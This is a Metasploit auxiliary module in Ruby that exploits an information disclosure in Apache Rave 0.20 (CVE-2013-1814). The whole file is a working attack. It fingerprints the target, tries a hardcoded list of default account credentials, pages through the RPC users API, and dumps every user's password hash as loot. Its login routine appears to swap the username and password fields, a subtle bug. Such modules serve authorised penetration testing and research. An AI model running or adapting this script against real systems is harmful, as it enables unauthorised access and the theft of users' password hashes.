##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Rave User Information Disclosure',
      'Description'    => %q{
        This module exploits an information disclosure in Apache Rave 0.20 and prior. The
        vulnerability exists in the RPC API, which allows any authenticated user to
        disclose information about all the users, including their password hashes. In order
        to authenticate, the user can provide his own credentials. Also the default users
        installed with Apache Rave 0.20 will be tried automatically. This module has been
        successfully tested on Apache Rave 0.20.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Andreas Guth', # Vulnerability discovery and PoC
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-1814' ],
          [ 'OSVDB', '91235' ],
          [ 'BID', '58455' ],
          [ 'EDB', '24744']
        ]
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Path to Apache Rave Portal', '/portal']),
        OptString.new('USERNAME', [ false, 'Apache Rave Username' ]),
        OptString.new('PASSWORD', [ false, 'Apache Rave Password' ]),
      ], self.class)
  end

  def login(username, password)
    uri = normalize_uri(target_uri.to_s, "j_spring_security_check")

    res = send_request_cgi({
      'uri'      => uri,
      'method'   => 'POST',
      'vars_post' => {
        'j_password' => username,
        'j_username' => password
      }
    })

    if res and res.code == 302 and res.headers['Location'] !~ /authfail/ and res.headers['Set-Cookie'] =~ /JSESSIONID=(.*);/
      return $1
    else
      return nil
    end
  end

  def disclose(cookie, offset)
    uri = normalize_uri(target_uri.to_s, "app", "api", "rpc", "users", "get")

    res = send_request_cgi({
      'uri'      => uri,
      'method'   => 'GET',
      'vars_get' => {
        'offset' => "#{offset}"
      },
      'cookie' => "JSESSIONID=#{cookie}"
    })

    if res and res.code == 200 and res.headers['Content-Type'] =~ /application\/json/ and res.body =~ /resultSet/
      return res.body
    else
      return nil
    end

  end

  def setup
    # Default accounts installed and enabled on Apache Rave 0.20
    @default_accounts = {
      "canonical" => "canonical",
      "john.doe" => "john.doe",
      "jane.doe" => "jane.doe",
      "johnldap" => "johnldap",
      "four.col" => "four.col",
      "fourwn.col" => "fourwn.col",
      "george.doe" => "george.doe",
      "maija.m" => "maija.m",
      "mario.rossi" => "mario.rossi",
      "one.col" => "one.col",
      "three.col" => "three.col",
      "threewn.col" => "threewn.col",
      "twown.col" => "twown.col"
    }
  end

  def run

    print_status("#{rhost}:#{rport} - Fingerprinting...")
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.to_s, "login"),
      'method'   => 'GET',
    })

    if not res
      print_error("#{rhost}:#{rport} - No response, aborting...")
      return
    elsif res.code == 200 and res.body =~ /<span>Apache Rave ([0-9\.]*)<\/span>/
      version =$1
      if version <= "0.20"
        print_good("#{rhost}:#{rport} - Apache Rave #{version} found. Vulnerable. Proceeding...")
      else
        print_error("#{rhost}:#{rport} - Apache Rave #{version} found. Not vulnerable. Aborting...")
        return
      end
    else
      print_warning("#{rhost}:#{rport} - Apache Rave Portal not found, trying to log-in anyway...")
    end

    cookie = nil
    unless datastore["USERNAME"].empty? or datastore["PASSWORD"].empty?
      print_status("#{rhost}:#{rport} - Login with the provided credentials...")
      cookie = login(datastore["USERNAME"], datastore["PASSWORD"])
      if cookie.nil?
        print_error("#{rhost}:#{rport} - Login failed.")
      else
        print_good("#{rhost}:#{rport} - Login successful. Proceeding...")
      end
    end

    if cookie.nil?
      print_status("#{rhost}:#{rport} - Login with default accounts...")
      @default_accounts.each { |user, password|
        print_status("#{rhost}:#{rport} - Login with the #{user} default account...")
        cookie = login(user, password)
        unless cookie.nil?
          print_good("#{rhost}:#{rport} - Login successful. Proceeding...")
          break
        end
      }
    end

    if cookie.nil?
      print_error("#{rhost}:#{rport} - Login failed. Aborting...")
      return
    end

    print_status("#{rhost}:#{rport} - Disclosing information...")
    offset = 0
    search = true

    while search
      print_status("#{rhost}:#{rport} - Disclosing offset #{offset}...")
      users_data = disclose(cookie, offset)
      if users_data.nil?
        print_error("#{rhost}:#{rport} - Disclosure failed. Aborting...")
        return
      else
        print_good("#{rhost}:#{rport} - Disclosure successful")
      end

      json_info = JSON.parse(users_data)

      path = store_loot(
        'apache.rave.users',
        'application/json',
        rhost,
        users_data,
        nil,
        "Apache Rave Users Database Offset #{offset}"
      )
      print_status("#{rhost}:#{rport} - Information for offset #{offset} saved in: #{path}")

      print_status("#{rhost}:#{rport} - Recovering Hashes...")
      json_info["result"]["resultSet"].each { |result|
        print_good("#{rhost}:#{rport} - Found cred: #{result["username"]}:#{result["password"]}")
        report_auth_info(
          :host => rhost,
          :port => rport,
          :sname => "Apache Rave",
          :user => result["username"],
          :pass => result["password"],
          :active => result["enabled"]
        )
      }

      page = json_info["result"]["currentPage"]
      total_pages = json_info["result"]["numberOfPages"]
      offset = offset + json_info["result"]["pageSize"]
      if page == total_pages
        search = false
      end

    end

  end

end
